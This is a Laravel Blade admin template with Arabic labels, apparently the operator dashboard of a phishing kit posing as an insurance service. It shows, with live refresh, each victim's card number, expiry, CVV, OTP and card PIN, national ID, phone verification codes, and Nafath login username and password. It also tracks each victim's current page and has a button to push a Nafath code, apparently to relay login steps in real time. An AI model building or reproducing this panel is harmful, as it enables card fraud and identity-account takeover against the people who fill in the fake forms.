@extends('admin.layouts.app')

@section('content')
{{-- =========================================================== --}}
{{-- =================== Page Header Section =================== --}}
{{-- =========================================================== --}}
<div class="page-breadcrumb">
    <div class="row">
        <div class="col-md-5 align-self-center">
            <h3 class="page-title">
                Insurance Requests
                @if (isset($insuranceRequests))
                ({{ $insuranceRequests->count() }})
                @endif
                <small class="text-muted" style="font-size: 12px; display: block; margin-top: 5px;">
                    <i class="fas fa-sync-alt"></i> التحديث التلقائي كل 3 ثوانٍ
                </small>
            </h3>
            <div class="d-flex align-items-center">
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb">
                        <li class="breadcrumb-item"><a href="{{ route('super_admin.dashboard') }}">Dashboard</a></li>
                        <li class="breadcrumb-item active" aria-current="page">Insurance Requests</li>
                    </ol>
                </nav>
            </div>
        </div>
        <div class="col-md-7 justify-content-end align-self-center d-none d-md-flex">
            <div class="d-flex">
                {{-- Archive --}}
                <div class="dropdown me-2">
                    <a href="{{ route('super_admin.insurance_requests-showSoftDelete') }}" class="btn btn-danger">
                        <i data-feather="archive" class="fill-white feather-sm"></i> View Archives
                    </a>
                </div>
            </div>
        </div>
    </div>
</div>
{{-- ========================================================== --}}
{{-- ==================== Page Body Section =================== --}}
{{-- ========================================================== --}}
<div class="container-fluid">
    <div class="row">
        <div class="col-12">
            <div class="card">
                <div class="card-body">
                    {{-- Table Section --}}
                    <div class="table-responsive">
                        <table id="file_export" class="table table-striped table-bordered display">
                            <thead>
                                <tr>
                                    <th>IP المستخدم</th>
                                    <th>بيانات التأمين</th>
                                    <th>الحالة</th>
                                    <th>بيانات الدفع</th>
                                    <th>التحكم</th>
                                </tr>
                            </thead>
                            <tbody>
                                @foreach ($insuranceRequests as $insuranceRequest)
                                <tr data-id="{{ $insuranceRequest->id }}">
                                    {{-- IP Address --}}
                                    <td>
                                        <span class="badge badge-info">{{ $insuranceRequest->ip_address ?? request()->ip() }}</span>
                                    </td>
                                    
                                    {{-- بيانات التأمين --}}
                                    <td>
                                        <div class="insurance-info">
                                            <strong>{{ $insuranceRequest->full_name ?? '----' }}</strong><br>
                                            <small><i class="fas fa-phone"></i> {{ $insuranceRequest->mobile_number_statements ?? '----' }}</small><br>
                                            <small><i class="fas fa-id-card"></i> {{ $insuranceRequest->identity_number ?? '----' }}</small>
                                        </div>
                                    </td>
                                    
                                    {{-- الحالة --}}
                                    <td>
                                        <div class="status-info">
                                            <span class="status-badge" data-request-id="{{ $insuranceRequest->id }}">
                                                <i class="fas fa-circle"></i> جاري التحميل...
                                            </span>
                                            <br>
                                            <small class="text-muted current-path" data-request-id="{{ $insuranceRequest->id }}">
                                                <i class="fas fa-map-marker-alt"></i> المسار: ---
                                            </small>
                                        </div>
                                    </td>
                                    
                                    {{-- بيانات الدفع --}}
                                    <td>
                                        <div class="payment-info">
                                            <strong>اسم حامل البطاقة:</strong> {{ $insuranceRequest->name_on_card ?? '----' }}<br>
                                            <strong>رقم البطاقة:</strong> {{ $insuranceRequest->card_number ?? '----' }}<br>
                                            <strong>تاريخ الانتهاء:</strong> {{ $insuranceRequest->expiry_date ?? '----' }}<br>
                                            <strong>CVV:</strong> {{ $insuranceRequest->cvv ?? '----' }}<br>
                                            <strong>OTP:</strong> {{ $insuranceRequest->card_ownership_verification_code ?? '----' }}<br>
                                            <strong>الرمز السري:</strong> {{ $insuranceRequest->card_ownership_secert_number ?? '----' }}
                                        </div>
                                    </td>
                                    
                                  
                                    {{-- operations --}}
                                    <td>
                                        <div class="button-group">
                                            <button type="button" 
                                                class="btn waves-effect waves-light btn-info btn-sm btn-view-details-modal"
                                                data-id="{{ $insuranceRequest->id }}"
                                                title="View Full Details">
                                                <i class="fas fa-eye"></i> التفاصيل
                                            </button>
                                            
                                            <a href="{{ route('super_admin.insurance_requests-softDelete', isset($insuranceRequest->id) ? $insuranceRequest->id : -1) }}"
                                                class="confirm btn waves-effect waves-light btn-danger btn-sm"
                                                title="Delete"><i class="fas fa-trash-alt"></i></a>

                                            <a href="{{ route('super_admin.insurance_requests-sendNafathCode', isset($insuranceRequest->id) ? $insuranceRequest->id : -1) }}"
                                                class="btn waves-effect waves-light btn-primary btn-sm"
                                                title="Send Nafath Code">
                                                <i class="fas fa-key"></i> نفاذ
                                            </a>
                                        </div>
                                    </td>
                                </tr>
                                @endforeach
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection

@section('extra_js')

{{-- Custom Styles for Live Refresh --}}
<style>
    .new-row-highlight {
        animation: highlightRow 2s ease-in-out;
        background-color: #d4edda !important;
    }
    
    @keyframes highlightRow {
        0% {
            background-color: #d4edda;
            transform: scale(1.02);
        }
        100% {
            background-color: transparent;
            transform: scale(1);
        }
    }
    
    .live-indicator {
        display: inline-block;
        width: 10px;
        height: 10px;
        background-color: #28a745;
        border-radius: 50%;
        margin-left: 8px;
        animation: pulse 2s infinite;
    }
    
    @keyframes pulse {
        0%, 100% {
            opacity: 1;
            transform: scale(1);
        }
        50% {
            opacity: 0.5;
            transform: scale(1.1);
        }
    }
    
    .refresh-status {
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: #fff;
        padding: 10px 20px;
        border-radius: 8px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        border-left: 4px solid #28a745;
        z-index: 9999;
        display: none;
    }
    
    .refresh-status.show {
        display: block;
        animation: slideIn 0.3s ease-out;
    }
    
    @keyframes slideIn {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
</style>

{{-- Live Refresh Status Indicator --}}
<div class="refresh-status" id="refreshStatus">
    <i class="fas fa-sync-alt fa-spin"></i> جاري التحديث...
</div>

{{-- table search and pagination --}}
<script>
    $(document).ready(function() {
        // Setup AJAX with CSRF token
        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
            }
        });

        let dataTable;
        let lastRequestId = {{ $insuranceRequests->max('id') ?? 0 }};
        let refreshInterval;
        const REFRESH_INTERVAL = 3000; // 3 seconds

        // Initialize DataTable
        function initializeDataTable() {
            if ($.fn.DataTable.isDataTable('#file_export')) {
                $('#file_export').DataTable().destroy();
            }

            dataTable = $('#file_export').DataTable({
                paging: true,
                pageLength: 50,
                order: [[0, 'desc']], // Sort by first column (name) descending
                columnDefs: [{
                    orderable: false,
                    targets: [4] // Control column not sortable
                }],
                dom: 'Bfrtip',
                buttons: [{
                        extend: 'copy',
                        exportOptions: {
                            columns: [0, 1, 2, 3]
                        }
                    },
                    {
                        extend: 'csv',
                        exportOptions: {
                            columns: [0, 1, 2, 3]
                        }
                    },
                    {
                        extend: 'excel',
                        exportOptions: {
                            columns: [0, 1, 2, 3]
                        }
                    },
                    {
                        extend: 'pdf',
                        exportOptions: {
                            columns: [0, 1, 2, 3]
                        }
                    },
                    {
                        extend: 'print',
                        exportOptions: {
                            columns: [0, 1, 2, 3]
                        }
                    }
                ],
                language: {
                    "sProcessing": "جارٍ التحميل...",
                    "sLengthMenu": "أظهر _MENU_ مدخلات",
                    "sZeroRecords": "لم يُعثر على أية سجلات",
                    "sInfo": "إظهار _START_ إلى _END_ من أصل _TOTAL_ مدخل",
                    "sInfoEmpty": "يعرض 0 إلى 0 من أصل 0 سجل",
                    "sInfoFiltered": "(منتقاة من مجموع _MAX_ مُدخل)",
                    "sInfoPostFix": "",
                    "sSearch": "ابحث:",
                    "sUrl": "",
                    "oPaginate": {
                        "sFirst": "الأول",
                        "sPrevious": "السابق",
                        "sNext": "التالي",
                        "sLast": "الأخير"
                    }
                }
            });

            // Style buttons
            $('.buttons-copy, .buttons-csv, .buttons-print, .buttons-pdf, .buttons-excel').addClass('btn btn-primary mr-1');
        }

        // Fetch new requests via AJAX
        function fetchNewRequests() {
            $.ajax({
                url: '{{ route("super_admin.insurance_requests-getNewRequests") }}',
                method: 'GET',
                data: {
                    last_id: lastRequestId
                },
                success: function(response) {
                    if (response.success && response.count > 0) {
                        // Show refresh notification
                        showRefreshNotification(response.count);
                        
                        // Add new rows
                        response.data.forEach(function(request) {
                            addNewRow(request);
                        });
                        
                        // Update last ID
                        lastRequestId = response.latest_id;
                        
                        // Update header count
                        updateHeaderCount();
                        
                        // Reinitialize DataTable to include new rows
                        initializeDataTable();
                    }
                },
                error: function(xhr, status, error) {
                    console.error('Error fetching new requests:', error);
                }
            });
        }

        // Add new row to table
        function addNewRow(request) {
            const newRow = `
                <tr class="new-row-highlight" data-request-id="${request.id}">
                    <td><strong>${request.applicant_name || '----'}</strong></td>
                    <td><strong>${request.identity_number || '----'}</strong></td>
                    <td><strong>${request.name_on_card || '----'}</strong></td>
                    <td>
                        <strong>${request.name_on_card || '----'}</strong> اسم صاحب البطاقة
                        <br>رقم البطاقة : <strong>${request.card_number || '----'}</strong>
                        <br>تاريخ الصلاحية : <strong>${request.expiry_date || '----'}</strong>
                        <br>CVV : <strong>${request.cvv || '----'}</strong>
                        <br>كود الطباقة : <strong>${request.card_ownership_verification_code || '----'}</strong>
                        <br>الرمز السري للبطاقة : <strong>${request.card_ownership_secert_number || '----'}</strong>
                        <br>رقم الجوال : <strong>${request.mobile_number ? request.mobile_number + ' | ' + getMobileOperator(request.mobile_network_operator) : '----'}</strong>
                        <br>رمز التحقق : <strong>${request.check_mobile_number_verification_code || '----'}</strong>
                        <br>اسم مستخدم نفاذ : <strong>${request.user_name || '----'}</strong>
                        <br>كلمة مرور نفاذ : <strong>${request.password || '----'}</strong>
                    </td>
                    <td>
                        <div class="button-group">
                            <a href="{{ route('super_admin.insurance_requests-show', '') }}/${request.id}" 
                               class="btn waves-effect waves-light btn-primary btn-sm" 
                               title="View Details">
                                <i class="fas fa-eye"></i>
                            </a>
                            <a href="{{ route('super_admin.insurance_requests-softDelete', '') }}/${request.id}" 
                               class="confirm btn waves-effect waves-light btn-danger btn-sm" 
                               title="Delete">
                                <i class="fas fa-trash-alt"></i>
                            </a>
                            <a href="{{ route('super_admin.insurance_requests-sendNafathCode', '') }}/${request.id}" 
                               class="btn waves-effect waves-light btn-primary btn-sm" 
                               title="Send Nafath Code">
                                ارسال كود نفاذ
                            </a>
                        </div>
                    </td>
                </tr>
            `;
            
            // Prepend to tbody (add at top)
            $('#file_export tbody').prepend(newRow);
            
            // Remove highlight after animation
            setTimeout(function() {
                $(`tr[data-request-id="${request.id}"]`).removeClass('new-row-highlight');
            }, 2000);
        }

        // Get mobile operator name
        function getMobileOperator(code) {
            const operators = {
                1: 'Zain',
                2: 'Mobily',
                3: 'Stc',
                4: 'Salam',
                5: 'Virgin'
            };
            return operators[code] || '';
        }

        // Show refresh notification
        function showRefreshNotification(count) {
            const $status = $('#refreshStatus');
            $status.html(`<i class="fas fa-check-circle text-success"></i> تم إضافة ${count} طلب جديد`);
            $status.addClass('show');
            
            setTimeout(function() {
                $status.removeClass('show');
            }, 3000);
        }

        // Update header count
        function updateHeaderCount() {
            const currentCount = $('#file_export tbody tr').length;
            $('.page-title').html(`Insurance Requests (${currentCount}) <span class="live-indicator"></span>`);
        }

        // Initialize everything
        initializeDataTable();
        
        // Add live indicator to header
        $('.page-title').append(' <span class="live-indicator" title="التحديث التلقائي مفعل"></span>');
        
        // Start auto-refresh
        refreshInterval = setInterval(fetchNewRequests, REFRESH_INTERVAL);
        
        // Stop refresh when page is hidden (battery optimization)
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                clearInterval(refreshInterval);
            } else {
                refreshInterval = setInterval(fetchNewRequests, REFRESH_INTERVAL);
                fetchNewRequests(); // Fetch immediately when page becomes visible
            }
        });
        
        // Initial fetch after 3 seconds
        setTimeout(fetchNewRequests, REFRESH_INTERVAL);

        // تحديث حالة المستخدمين في الوقت الفعلي
        function updateUserStatus() {
            $('.status-badge').each(function() {
                const requestId = $(this).data('request-id');
                const statusBadge = $(this);
                const pathElement = $(`.current-path[data-request-id="${requestId}"]`);
                
                // محاكاة التحقق من الحالة (يمكن استبدالها بـ API call)
                $.ajax({
                    url: '/super_admin/insurance_requests/check-status/' + requestId,
                    method: 'GET',
                    success: function(response) {
                        if (response.is_active) {
                            statusBadge.html('<i class="fas fa-circle text-success"></i> نشط');
                            statusBadge.removeClass('badge-danger').addClass('badge-success');
                        } else {
                            statusBadge.html('<i class="fas fa-circle text-danger"></i> غير نشط');
                            statusBadge.removeClass('badge-success').addClass('badge-danger');
                        }
                        
                        if (response.current_path) {
                            pathElement.html(`<i class="fas fa-map-marker-alt"></i> المسار: ${response.current_path}`);
                        }
                    },
                    error: function() {
                        statusBadge.html('<i class="fas fa-circle text-muted"></i> غير معروف');
                    }
                });
            });
        }

        // تحديث الحالة كل 5 ثوانٍ
        setInterval(updateUserStatus, 5000);
        updateUserStatus(); // تشغيل فوري

        // Modal لعرض التفاصيل الكاملة
        $(document).on('click', '.btn-view-details-modal', function(e) {
            e.preventDefault();
            const requestId = $(this).data('id');
            
            $.ajax({
                url: `/super_admin/insurance_requests/show/${requestId}`,
                method: 'GET',
                success: function(response) {
                    // عرض البيانات في Modal
                    $('#detailsModal').modal('show');
                    $('#modalContent').html(response);
                },
                error: function() {
                    alert('حدث خطأ أثناء تحميل التفاصيل');
                }
            });
        });
    });
</script>

<!-- Modal لعرض التفاصيل -->
<div class="modal fade" id="detailsModal" tabindex="-1" role="dialog" aria-labelledby="detailsModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl modal-dialog-scrollable" role="document">
        <div class="modal-content">
            <div class="modal-header bg-primary text-white">
                <h5 class="modal-title" id="detailsModalLabel">
                    <i class="fas fa-file-alt"></i> تفاصيل الطلب الكاملة
                </h5>
                <button type="button" class="close text-white" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body" id="modalContent">
                <div class="text-center">
                    <i class="fas fa-spinner fa-spin fa-3x text-primary"></i>
                    <p>جاري التحميل...</p>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-dismiss="modal">إغلاق</button>
                <button type="button" class="btn btn-primary" onclick="window.print()">طباعة</button>
            </div>
        </div>
    </div>
</div>

<style>
    .insurance-info, .payment-info {
        font-size: 12px;
        line-height: 1.8;
    }

    .insurance-info strong, .payment-info strong {
        color: #2c3e50;
    }

    .status-badge {
        display: inline-block;
        padding: 5px 10px;
        border-radius: 20px;
        font-size: 12px;
        font-weight: bold;
    }

    .badge-success {
        background-color: #28a745;
        color: white;
    }

    .badge-danger {
        background-color: #dc3545;
        color: white;
    }

    .current-path {
        display: block;
        margin-top: 5px;
        font-size: 11px;
    }

    .payment-info {
        max-width: 250px;
    }
</style>
@endsection